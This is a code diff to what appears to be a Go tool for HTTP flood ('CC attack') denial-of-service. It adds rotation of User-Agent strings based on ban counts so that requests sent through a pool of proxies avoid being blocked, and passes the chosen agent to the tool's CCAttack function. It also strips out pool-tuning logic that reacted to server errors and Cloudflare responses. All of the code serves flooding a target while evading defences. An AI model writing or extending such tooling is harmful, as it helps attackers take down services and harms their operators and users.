@@ -4,7 +4,6 @@ import (
 	"fmt"
 	"github.com/go-resty/resty/v2"
 	"io/ioutil"
-	"strings"
 	"sync"
 	"time"
 
@@ -83,9 +82,28 @@ func main() {
 		alivePlist = PList
 	}
 
+	UAList := utils.GetRandUA()
+	minBanned := 0
+	go func() {
+		for {
+			wg.Add(1)
+			fmt.Printf("\nRefresh User-Agent.")
+
+			for k, val := range UAList {
+				if val.BannedCounts < UAList[minBanned].BannedCounts {
+					minBanned = k
+				}
+			}
+			UAList[minBanned] = utils.UserAgent{ID: minBanned, UA: utils.GetRandUA()[minBanned].UA, BannedCounts: UAList[minBanned].BannedCounts}
+			wg.Done()
+			time.Sleep(10 * time.Second)
+		}
+	}()
+	wg.Wait()
+
 	pool, _ := ants.NewPoolWithFunc(config.Cfg.Connections, func(i interface{}) {
 		p := i.(int)
-		_ = utils.CCAttack(&alivePlist[p], &counts, &resp)
+		_ = utils.CCAttack(&alivePlist[p], &counts, &resp, &UAList[minBanned])
 		wg.Done()
 	})
 	defer pool.Release()
@@ -93,14 +111,6 @@ func main() {
 	//monitor status
 	go func() {
 		for {
-			switch {
-			case strings.Contains(resp.String(), "cloudflare"):
-				break
-			case resp.StatusCode() > 499 && pool.Cap() > 24:
-				pool.Tune(pool.Cap() - 10)
-			case strings.Contains(resp.String(), "token is error") && pool.Cap() < 3*config.Cfg.Connections:
-				pool.Tune(pool.Cap() + 30)
-			}
 			i := 0
 			for _, v := range alivePlist {
 				if !v.CFCheck {
